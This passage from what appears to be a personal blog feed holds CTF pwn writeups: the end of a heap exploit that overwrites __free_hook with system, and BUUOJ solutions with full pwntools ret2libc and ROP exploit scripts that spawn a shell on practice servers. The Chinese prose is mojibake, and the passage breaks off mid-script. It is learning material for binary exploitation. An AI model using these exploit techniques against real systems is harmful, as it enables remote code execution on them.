class="hljs-comment"># so continuous testing for a most significant half byte of heap address is IS_MMAPED on. </span><br>            log.info(<span class="hljs-string">&quot;error&quot;</span>)<br>            p.close()<br>            <span class="hljs-keyword">continue</span><br>    <span class="hljs-keyword">except</span> BrokenPipeError:<br>        log.info(<span class="hljs-string">&quot;error&quot;</span>)<br>        <span class="hljs-keyword">continue</span><br><span class="hljs-comment">#0x133707e0:     0x2b863cd060000000      0x0000000000000056</span><br><span class="hljs-comment">#0x133707f0:     0x00007f36a1fc1b58      0x0000562b863cd060</span><br><span class="hljs-comment">#0x13370800:     0x956bc5b57f846f56      0xfd29773a11768444</span><br><span class="hljs-comment"># clear out value used to xor decryption. and set condition to pass check in `view`</span><br><span class="hljs-comment"># @base is random read/write target address.</span><br><span class="hljs-comment"># the left xored size of chunk0 is large enough.</span><br>p1 = p64(<span class="hljs-number">0</span>)*<span class="hljs-number">5</span>+p64(<span class="hljs-number">0x13377331</span>)+p64(base+<span class="hljs-number">0x30</span>)<br>edit(<span class="hljs-number">2</span>,<span class="hljs-built_in">len</span>(p1),p1)<br> <br><span class="hljs-comment"># read out some heap address</span><br><span class="hljs-comment"># p2 = p64(0)*3+p64(0x13377331)+p64(base)+p64(0x100)+p64(base-0x20+3)+p64(8)</span><br>p2 = p64(base-<span class="hljs-number">0x20</span>+<span class="hljs-number">3</span>)+p64(<span class="hljs-number">8</span>)<br>edit(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(p2),p2)<br>heap = u64(view(<span class="hljs-number">1</span>)[<span class="hljs-number">0</span>:<span class="hljs-number">8</span>])<br>log.success(<span class="hljs-string">&quot;heap address is : &quot;</span>+<span class="hljs-built_in">hex</span>(heap))<br> <br>p3 = p64(heap+<span class="hljs-number">0x10</span>)+p64(<span class="hljs-number">8</span>)<br>edit(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(p3),p3)<br>unsort_bin = u64(view(<span class="hljs-number">1</span>)[<span class="hljs-number">0</span>:<span class="hljs-number">8</span>])<br>libc_base = unsort_bin - <span class="hljs-number">0x3c1b58</span><br>log.success(<span class="hljs-string">&quot;unsort bin is : &quot;</span> + <span class="hljs-built_in">hex</span>(unsort_bin))<br>log.success(<span class="hljs-string">&quot;libc address is : &quot;</span> + <span class="hljs-built_in">hex</span>(libc_base))<br><br>system = libc_base + elf.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br>free  = libc_base + elf.symbols[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>log.success(<span class="hljs-string">&quot;free address is : &quot;</span>+<span class="hljs-built_in">hex</span>(free))<br>log.success(<span class="hljs-string">&quot;system address is : &quot;</span>+<span class="hljs-built_in">hex</span>(system))<br> <br>p4 = p64(free)+p64(<span class="hljs-number">0x100</span>)+p64(base+<span class="hljs-number">0x50</span>)+p64(<span class="hljs-number">0x100</span>)+<span class="hljs-string">b&#x27;/bin/sh\0&#x27;</span><br>edit(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(p4),p4)<br>edit(<span class="hljs-number">1</span>,<span class="hljs-number">8</span>,p64(system))<br> <br>p.recvuntil(<span class="hljs-string">&#x27;Command: &#x27;</span>)<br>sl(<span class="hljs-string">&quot;3&quot;</span>)<br>p.recvuntil(<span class="hljs-string">&#x27;Index: &#x27;</span>)<br>sl(<span class="hljs-string">&#x27;2&#x27;</span>)<br> <br>p.interactive()<br></code></pre></div></td></tr></table></figure><p>â€‹                                </p><h1 id="Tcache-attack"><a href="#Tcache-attack" class="headerlink" title="Tcache attack"></a>Tcache attack</h1><ul><li>å†…å­˜é‡Šæ”¾ï¼š<ul><li>åœ¨ free å‡½æ•°çš„æœ€å…ˆå¤„ç†éƒ¨åˆ†ï¼Œé¦–å…ˆæ˜¯æ£€æŸ¥é‡Šæ”¾å—æ˜¯å¦é¡µå¯¹é½åŠå‰åå †å—çš„é‡Šæ”¾æƒ…å†µï¼Œä¾¿ä¼˜å…ˆæ”¾å…¥ tcache ç»“æ„ä¸­ã€‚</li></ul></li><li>å†…å­˜ç”³è¯·ï¼š<ul><li>é¦–å…ˆï¼Œç”³è¯·çš„å†…å­˜å—ç¬¦åˆ fastbin å¤§å°æ—¶å¹¶ä¸”åœ¨ fastbin å†…æ‰¾åˆ°å¯ç”¨çš„ç©ºé—²å—æ—¶ï¼Œä¼šæŠŠè¯¥ fastbin é“¾ä¸Šçš„å…¶ä»–å†…å­˜å—æ”¾å…¥ tcache ä¸­ã€‚</li><li>å…¶æ¬¡ï¼Œç”³è¯·çš„å†…å­˜å—ç¬¦åˆ smallbin å¤§å°æ—¶å¹¶ä¸”åœ¨ smallbin å†…æ‰¾åˆ°å¯ç”¨çš„ç©ºé—²å—æ—¶ï¼Œä¼šæŠŠè¯¥ smallbin é“¾ä¸Šçš„å…¶ä»–å†…å­˜å—æ”¾å…¥ tcache ä¸­ã€‚</li><li>å½“åœ¨ unsorted bin é“¾ä¸Šå¾ªç¯å¤„ç†æ—¶ï¼Œå½“æ‰¾åˆ°å¤§å°åˆé€‚çš„é“¾æ—¶ï¼Œå¹¶ä¸ç›´æ¥è¿”å›ï¼Œè€Œæ˜¯å…ˆæ”¾åˆ° tcache ä¸­ï¼Œç»§ç»­å¤„ç†ã€‚</li></ul></li></ul><section class="footnotes"><div class="footnote-list"><ol><li><span id="fn:1" class="footnote-text"><span>ä¸ä¸Šæ¡ç±»ä¼¼ï¼Œæˆ‘ä»¬åŒæ ·å°†åˆ†é…ä½œä¸ºcontentçš„chunkç§°ä¸ºcontent chunk<a href="#fnref:1" rev="footnote" class="footnote-backref"> â†©</a></span></span></li><li><span id="fn:2" class="footnote-text"><span>ä¸ºäº†æ–¹ä¾¿ï¼Œæˆ‘ä»¬å°†åˆ†é…ä½œä¸ºnoteçš„chunkç§°ä¸ºnote chunk<a href="#fnref:2" rev="footnote" class="footnote-backref"> â†©</a></span></span></li></ol></div></section>]]></content>
    
    
    <categories>
      
      <category>src code</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ptmalloc</tag>
      
      <tag>æºç åˆ†æ</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BUUOJ_Writeup</title>
    <link href="/2021-07/pwn-start-BUUOJ-writeup/"/>
    <url>/2021-07/pwn-start-BUUOJ-writeup/</url>
    
    <content type="html"><![CDATA[<h2 id="1-å‰å…­é“é¢˜å°ç»“-æœ‰ç‚¹æ‡’ç›´æ¥æ€»ç»“"><a href="#1-å‰å…­é“é¢˜å°ç»“-æœ‰ç‚¹æ‡’ç›´æ¥æ€»ç»“" class="headerlink" title="1.å‰å…­é“é¢˜å°ç»“:(æœ‰ç‚¹æ‡’ç›´æ¥æ€»ç»“)"></a>1.å‰å…­é“é¢˜å°ç»“:(æœ‰ç‚¹æ‡’ç›´æ¥æ€»ç»“)</h2><ul><li>ç¬¬ä¸€é¢˜æµ‹è¯•ncå‘½ä»¤</li><li>pwn1_sctf_2016: ä¸€å †std::stringå•¥çš„æ“ä½œ<strong>æ ¹æœ¬æ²¡çœ‹æ‡‚æ˜¯ä»€ä¹ˆ</strong>.</li><li>ciscn_n_1: æ ˆæº¢å‡ºè¦†ç›–æµ®ç‚¹æ•°è¿‡ifè¯­å¥, ç›´æ¥åˆ°IDA ViewæŸ¥çœ‹åå…­è¿›åˆ¶çš„æ•°å€¼å°±å¯ä»¥äº†</li><li>å‰©ä¸‹çš„å‡ é¢˜å¤ªç®€å•äº†(å›å¤´æ¥çœ‹çš„é¢˜éƒ½æ˜¯è¿™ä¹ˆç®€å•!) </li></ul><h2 id="2-ciscn-2019-c-1"><a href="#2-ciscn-2019-c-1" class="headerlink" title="2. ciscn_2019_c_1"></a>2. ciscn_2019_c_1</h2><ul><li>ç”±äºæ²¡æœ‰ç»™å‡ºlibcåº“ä»¥åŠlibcåº“çš„ç‰ˆæœ¬, æ‰€ä»¥git clone pythonçš„LibcSearcheråº“, å¹¶ä¸”å­¦ä¹ å¦‚ä½•ä½¿ç”¨.</li></ul><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#context.log_level = &#x27;debug&#x27;</span><br>ret_addr = <span class="hljs-number">0x4006b9</span> <span class="hljs-comment">#è¿™ä¸¤ä¸ªæ˜¯ç”¨ROPgadgetæ‰¾åˆ°çš„, ä½¿ç”¨äº†ROPgadget --binary filename --only &quot;pop|ret&quot; | grep rdiå‘½ä»¤</span><br>rdipop_addr = <span class="hljs-number">0x400c83</span><br><br>c = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> c == <span class="hljs-number">0</span>:<br>    p = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="hljs-number">28804</span>)<br><span class="hljs-keyword">else</span>:<br>    p = process(<span class="hljs-string">&quot;./ciscn_2019_c_1&quot;</span>)<br>p.sendlineafter(<span class="hljs-string">&#x27;ice!\n&#x27;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br><br>elf = ELF(<span class="hljs-string">&quot;./ciscn_2019_c_1&quot;</span>)  <span class="hljs-comment">#class pwnlib.elf.elf.ELF(path, checksec=True)æ³¨æ„å‚æ•°æ˜¯è·¯å¾„,åˆ«å¿˜äº†&quot;./&quot;</span><br>plt_addr = elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>got_addr = elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>main_addr = elf.symbols[<span class="hljs-string">&#x27;main&#x27;</span>]<br><span class="hljs-comment">#                     x64æœºå™¨å‹å…¥å‚æ•°     å”¯ä¸€ä¸€ä¸ªå‚æ•°     retæŒ‡ä»¤è·³è½¬åˆ°çš„åœ°å€  å‡½æ•°è¿”å›åœ°å€(é‡æ–°åˆ°main)</span><br>payload = <span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">0x58</span> + p64(rdipop_addr) + p64(got_addr) + p64(plt_addr) + p64(main_addr)<br>p.sendlineafter(<span class="hljs-string">&quot;pted\n&quot;</span>, payload)<br>p.recvuntil(<span class="hljs-string">&#x27;Ciphertext\n&#x27;</span>)<br>p.recvline()<br>addr = u64(p.recv(<span class="hljs-number">7</span>)[:-<span class="hljs-number">1</span>].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))  <span class="hljs-comment">#æˆ‘ä¹Ÿä¸çŸ¥é“è¿™æ˜¯ä¸ºå•¥</span><br><br>libc = LibcSearcher(<span class="hljs-string">&quot;puts&quot;</span>, addr)<br>libc_base = addr - libc.dump(<span class="hljs-string">&quot;puts&quot;</span>)<br>sys_addr = libc_base + libc.dump(<span class="hljs-string">&quot;system&quot;</span>)<br>binsh_addr = libc_base + libc.dump(<span class="hljs-string">&quot;str_bin_sh&quot;</span>)<br><span class="hljs-comment">#                     æ ˆå¹³è¡¡           x64æœºå™¨å‹å…¥å‚æ•°     å”¯ä¸€ä¸€ä¸ªå‚æ•°       retæŒ‡ä»¤è·³è½¬åˆ°çš„åœ°å€</span><br>payload = <span class="hljs-string">b&#x27;d&#x27;</span>*<span class="hljs-number">0x58</span> + p64(ret_addr) + p64(rdipop_addr) + p64(binsh_addr) + p64(sys_addr)<br>p.sendlineafter(<span class="hljs-string">&quot;ice!\n&quot;</span>, <span class="hljs-string">b&quot;1&quot;</span>)<br>p.sendlineafter(<span class="hljs-string">&quot;ted\n&quot;</span>, payload)<br><br>p.interactive() <span class="hljs-comment">#å°†ç¨‹åºçš„è¾“å‡ºè¾“å…¥æµæ”¹ä¸º æ ‡å‡†è¾“å‡ºè¾“å…¥æµ</span><br></code></pre></div></td></tr></table></figure><p>tips:</p><ul><li><p><code>payload = b&#39;b&#39;*0x58 + p64(rdipop_addr) + p64(got_addr) + p64(plt_addr) + p64(main_addr)</code></p><p>GOTé¡¾åæ€ä¹‰å®ƒåªæ˜¯ä¸€å¼ è¡¨, ç¬¬ä¸€æ¬¡é“¾æ¥åå­˜æ”¾ç€å‡½æ•°çš„èµ·å§‹åœ°å€, pltè¡¨ä¸­ä½¿ç”¨ jmp *GOT[4], å³GOTè¡¨å…ƒç´ çš„å¼•ç”¨, ç¬¬ä¸‰ä¸ªp64ä¸èƒ½æ”¹ä¸ºgot_addr!!!!!!!!!!!!!</p></li></ul><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment">#LibcSearcherç”¨æ³•.(å°±æ˜¯æŸä½å›½äººå†™çš„å°å·¥å…·, è‡³äºä¸ºå•¥æ˜¯str_bin_shæˆ‘è¿˜ä¸çŸ¥é“.......)</span><br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#ç¬¬äºŒä¸ªå‚æ•°ï¼Œä¸ºå·²æ³„éœ²çš„å®é™…åœ°å€,æˆ–æœ€å12ä½(æ¯”å¦‚ï¼šd90)ï¼Œintç±»å‹</span><br>obj = LibcSearcher(<span class="hljs-string">&quot;fgets&quot;</span>, <span class="hljs-number">0X7ff39014bd90</span>)<br>obj.dump(<span class="hljs-string">&quot;system&quot;</span>)        <span class="hljs-comment">#system åç§»</span><br>obj.dump(<span class="hljs-string">&quot;str_bin_sh&quot;</span>)    <span class="hljs-comment">#/bin/sh åç§»</span><br>obj.dump(<span class="hljs-string">&quot;__libc_start_main_ret&quot;</span>)    <br></code></pre></div></td></tr></table></figure><h2 id="3-PWN5-æ™®é€šçš„æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´"><a href="#3-PWN5-æ™®é€šçš„æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´" class="headerlink" title="3. PWN5(æ™®é€šçš„æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´)"></a>3. PWN5(æ™®é€šçš„æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´)</h2><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">fmtstr_payload</span>(<span class="hljs-params">offset, writes, numbwritten=<span class="hljs-number">0</span>, write_size=<span class="hljs-string">&#x27;byte&#x27;</span>, write_size_max=<span class="hljs-string">&#x27;long&#x27;</span>, </span></span><br><span class="hljs-params"><span class="hljs-function">                   overflows=<span class="hljs-number">16</span>, strategy=<span class="hljs-string">&quot;small&quot;</span>, badbytes=<span class="hljs-built_in">frozenset</span>(<span class="hljs-params"></span>), offset_bytes=<span class="hljs-number">0</span></span>):</span> â†’ <span class="hljs-built_in">str</span><br><span class="hljs-string">&#x27;&#x27;&#x27;Makes payload with given parameter. It can generate payload for 32 or 64 bits architectures. </span><br><span class="hljs-string">The size of the addr is taken from context.bits</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>Parameters:<br>offset (<span class="hljs-built_in">int</span>) â€“ the first formatterâ€™s offset you control<br>writes (<span class="hljs-built_in">dict</span>) â€“ <span class="hljs-built_in">dict</span> <span class="hljs-keyword">with</span> addr, value &#123;addr: value, addr2: value2&#125;<br>numbwritten (<span class="hljs-built_in">int</span>) â€“ number of byte already written by the printf function<br>write_size (<span class="hljs-built_in">str</span>) â€“ must be byte, short <span class="hljs-keyword">or</span> <span class="hljs-built_in">int</span>. Tells <span class="hljs-keyword">if</span> you want to write byte by byte, <br>short by short <span class="hljs-keyword">or</span> <span class="hljs-built_in">int</span> by <span class="hljs-built_in">int</span> (hhn, hn <span class="hljs-keyword">or</span> n)<br>overflows (<span class="hljs-built_in">int</span>) â€“ how many extra overflows (at size sz) to tolerate to reduce the length of <br>the <span class="hljs-built_in">format</span> string<br>strategy (<span class="hljs-built_in">str</span>) â€“ either â€˜fastâ€™ <span class="hljs-keyword">or</span> â€˜smallâ€™ (â€˜smallâ€™ <span class="hljs-keyword">is</span> default, â€˜fastâ€™ can be used <span class="hljs-keyword">if</span> there <br>                                                are many writes)<br>Returns:<br>The payload <span class="hljs-keyword">in</span> order to do needed writes<br></code></pre></div></td></tr></table></figure><h2 id="4-BabyRop-0"><a href="#4-BabyRop-0" class="headerlink" title="4. BabyRop[0]."></a>4. BabyRop<a href="https://blog.csdn.net/weixin_44677409/article/details/113769436">[0]</a>.</h2><p>æŸ¥çœ‹ç¨‹åºçš„ä¿æŠ¤æœºåˆ¶<img src="https://i.loli.net/2021/07/22/Ri6VUFBHCIbNpmj.png" alt="image-20210722002115059"> </p><p>å‘ç°æ˜¯gotè¡¨ä¸å¯å†™çš„32ä½ç¨‹åº<br>æ‹–è¿›idaæŸ¥çœ‹ä¼ªä»£ç <img src="https://i.loli.net/2021/07/22/18Yp72mcR5gDEoV.png" alt="image-20210722002553447"> </p><p>sub_80486BBæ˜¯åˆå§‹åŒ–ç¼“å­˜åŒºçš„å‡½æ•°<br>å‘ç°bufæ˜¯ä¸€ä¸ªéšæœºæ•°<img src="https://i.loli.net/2021/07/22/k7LqQlvpzZsFEry.png" alt="image-20210722002240287"> </p><p>å‘ç°å‡½æ•°ä¸­å­˜åœ¨strncmpæ¯”è¾ƒå‡½æ•°ï¼Œå…¶ä¸­bufä¸ºç”¨æˆ·è¾“å…¥çš„å€¼ï¼Œsä¸ºbuféšæœºæ•°ï¼Œå¦‚æœä¸ç›¸ç­‰åˆ™ä¼šé€€å‡ºç¨‹åºï¼Œ<u>æ‰€ä»¥éœ€è¦æƒ³åŠæ³•ç»•è¿‡è¿™ä¸ªåˆ¤æ–­ï¼Œæ‰€ä»¥v1çš„å€¼å¿…é¡»ä¸º0</u>.</p><p>v1 = strlen(buf),strlenè¿™ä¸ªå‡½æ•°æœ‰ä¸ª<strong>ç¼ºé™·</strong>ï¼šé‡åˆ°\x00ç›´æ¥æˆªæ–­ã€‚æ‰€ä»¥æˆ‘ä»¬è¦è¾“å…¥ç¬¬ä¸€ä½æ•°ä¸º\x00</p><p>bufè¢«IDAè¯†åˆ«ä¸º32ä½æ•°ç»„, å‡½æ•°è¿”å›å€¼æ˜¯buf[7], æ‰€ä»¥ç›´æ¥å°†buf[7]å†™æˆæƒ³è¦çš„æ•°å€¼å³å¯</p><p>æ¥ä¸‹æ¥æ¥çœ‹æœ€åä¸€ä¸ªå‡½æ•°<img src="https://i.loli.net/2021/07/22/l6dPBCuI5vsyKNL.png" alt="image-20210722002708919"> </p><p>å…¶ä¸­a1å³ä¸ºä¸Šæ–‡ä¸­çš„v5ï¼Œå‡å¦‚a1ç­‰äº127åˆ™ä¼šæ‰§è¡Œç¬¬ä¸€æ¡è¯­å¥ï¼Œä¸ä¼šæº¢å‡ºï¼Œå½“a1å¤§äº0xE7æ—¶å°±ä¼šå­˜åœ¨æº¢å‡ºï¼Œä»è€Œè¦†ç›–è¿”å›åœ°å€</p><p>è§£é¢˜æ€è·¯ï¼šé¦–å…ˆé€šè¿‡\x00æ¥ç»•è¿‡åˆ¤æ–­ï¼Œè¦†ç›–v5ä¸º\xffï¼ˆä½¿å¾—v5å°½å¯èƒ½çš„å¤§ï¼‰ï¼Œé€šè¿‡wirteå‡½æ•°æ¥æ³„éœ²writeçš„å†…å­˜åœ°å€ï¼Œç„¶ååˆ©ç”¨libcæ¥è®¡ç®—systemå‡½æ•°åœ°å€ï¼Œæœ€ååˆ©ç”¨æº¢å‡ºä½¿å¾—è¿”å›åœ°å€ä¸ºsystem</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">28361</span>)<br><span class="hljs-comment">#ignore the strncmp and overwrite buf[7] to the max\xff</span><br>payload = <span class="hljs-string">b&#x27;\x00&#x27;</span> + <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">6</span> + <span class="hljs-string">b&#x27;\xff&#x27;</span><br>p.sendline(payload)<br><span class="hljs-comment">#jump to read(0, buf, a1) and char buf[231]</span><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0xe7</span>+<span class="hljs-number">0x4</span>)<br><span class="hljs-comment">#leak the write_addr</span><br>elf = ELF(<span class="hljs-string">&quot;./babyrop&quot;</span>, <span class="hljs-number">0</span>)<br>got = elf.got[<span class="hljs-string">&quot;write&quot;</span>]<br>plt = elf.plt[<span class="hljs-string">&quot;write&quot;</span>]<br>main = <span class="hljs-number">0x8048825</span><br><br>payload = payload + p32(plt) + p32(main) + p32(<span class="hljs-number">1</span>) + p32(got) + p32(<span class="hljs-number">4</span>)<br><span class="hljs-comment">#payload = flat([b&#x27;a&#x27;*(0xe7+0x4), plt, main, 1, got, 4])</span><br>p.sendlineafter(<span class="hljs-string">&quot;ct\n&quot;</span>, payload)<br>write_addr = u32(p.recv(<span class="hljs-number">4</span>))<br><br><span class="hljs-comment">#calc the sys_addr and returned to the main function </span><br>libc = ELF(<span class="hljs-string">&quot;./libc-2.23.so&quot;</span>, <span class="hljs-number">0</span>)<br>sys_libc = libc.symbols[<span class="hljs-string">&quot;system&quot;</span>]<br>write_libc = libc.symbols[<span class="hljs-string">&quot;write&quot;</span>]<br>binsh_libc  = <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&quot;/bin/sh&quot;</span>))<br><br>libc_base = write_addr - write_libc<br>sys = libc_base + sys_libc<br>binsh = libc_base + binsh_libc<br><br><span class="hljs-comment">#constrct the payload</span><br>payload = <span class="hljs-string">b&#x27;\x00&#x27;</span> + <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">6</span> + <span class="hljs-string">b&#x27;\xff&#x27;</span><br>p.sendline(payload)<br>payload = flat([<span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0xe7</span>+<span class="hljs-number">0x4</span>), sys, <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">4</span>, binsh])<br>p.sendlineafter(<span class="hljs-string">&quot;ct\n&quot;</span>, payload)<br>p.interactive()<br></code></pre></div></td></tr></table></figure><p><strong>tips:</strong>.</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment">#æ–°ç”¨æ³•get:</span><br>sl=<span class="hljs-keyword">lambda</span> x:io.sendline(x)<br>sla=<span class="hljs-keyword">lambda</span> x,y:io.sendlineafter(x,y)<br>rl=<span class="hljs-keyword">lambda</span> :io.recvline()<br>ru=<span class="hljs-keyword">lambda</span> x:io.recvuntil(x)<br></code></pre></div></td></tr></table></figure><ul><li><p>strlen()å‡½æ•°é‡åˆ°â€™\0â€™å°±ä¼šåœæ­¢!!!!!!</p></li><li><p>åˆ«å¿˜äº†å…ˆæ˜¯<strong>å‚æ•°</strong>åæ˜¯sysçš„<strong>è¿”å›åœ°å€</strong>.</p></li><li><p>pack():   Word-size, endianness and signedness is done according to context</p><p>æ‰€ä»¥, flat()ä¸­çš„wordsizeå°±ä¸ç”¨ç®¡äº†, è‡ªåŠ¨ä½¿ç”¨ç›¸åº”çš„pack()å‡½æ•°</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">pwnlib.util.packing.flat(*a, **kw)<br>- flat(*args, preprocessor = <span class="hljs-literal">None</span>, length = <span class="hljs-literal">None</span>, filler = de_bruijn(), <span class="hljs-comment">#???debruijnæ˜¯ä¸ªä»€ä¹ˆä¸œè¥¿</span><br>  word_size = <span class="hljs-literal">None</span>, endianness = <span class="hljs-literal">None</span>, sign = <span class="hljs-literal">None</span>) -&gt; <span class="hljs-built_in">str</span><br></code></pre></div></td></tr></table></figure></li></ul><h2 id="6-ciscn-2019-n-8"><a href="#6-ciscn-2019-n-8" class="headerlink" title="6.ciscn_2019_n_8"></a>6.ciscn_2019_n_8</h2><ul><li>ä¸‰ç§æ–¹æ³•ä¸€åº”ä¿±å…¨<a href="https://www.cnblogs.com/bhxdn/p/12679290.html">[0]</a>.</li><li>è¿˜æ˜¯çœ‹åˆ«äººçš„æ‰åšçš„å‡ºæ¥, ä¸ç„¶è°ä¼šçŸ¥é“:<ul><li>get_flagçš„è¿”å›åœ°å€ä¸èƒ½ä¹±å†™ï¼Œæ‰“è¿œç¨‹æ—¶ï¼Œå¦‚æœç¨‹åºæ˜¯å¼‚å¸¸é€€å‡ºäº†ï¼Œæœ€åæ˜¯ä¸ç»™ä½ å›æ˜¾çš„. </li><li>æ­£å¸¸é€€å‡ºéœ€è¦ä½¿ç”¨exit(), æ‰€ä»¥å°†get_flagçš„è¿”å›åœ°å€å†™æˆexitçš„åœ°å€</li><li>å¦‚æœæ­£å¸¸é€€å‡º, ä½ ä¸åŠ ä¸€ä¸ªp.recv()æ¥å—å­—ç¬¦, ä»ç„¶æ²¡æœ‰å›æ˜¾.</li><li>è¿˜æœ‰å°±æ˜¯ä¿®æ”¹bssæ®µçš„æƒé™, é«˜çº§æ“ä½œ, åˆå¾—å­¦ä¸€ä¸ªå‡½æ•°**(è¿˜æ²¡å­¦)**.</li></ul></li></ul><h2 id="7-not-the-same"><a href="#7-not-the-same" class="headerlink" title="7.not_the_same"></a>7.not_the_same</h2><ul><li>ç®€å•çš„æ ˆæº¢å‡ºé¢˜ç›®, å°±ä¸æˆªå›¾äº†, å’Œç¬¬å…­é¢˜æ˜¯ä¸€æ ·çš„, éœ€è¦æ³¨æ„exitæ­£å¸¸é€€å‡ºç¨‹åºåå¿…é¡»recvå‡ ä¸ªå­—ç¬¦è¿œç¨‹æ‰ä¼šæœ‰è¾“å‡º</li><li>å¯ä»¥çœ‹åˆ°æˆ‘åšäº†ä¸€ä¸ªä¸‡èƒ½å¤´, ä»¥åå†™expåªè¦å¤åˆ¶ä¿®æ”¹ä¸€ä¸‹å°±å¯ä»¥äº†, è¿˜æ˜¯æŒºæ–¹ä¾¿çš„</li></ul><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>context.binary = 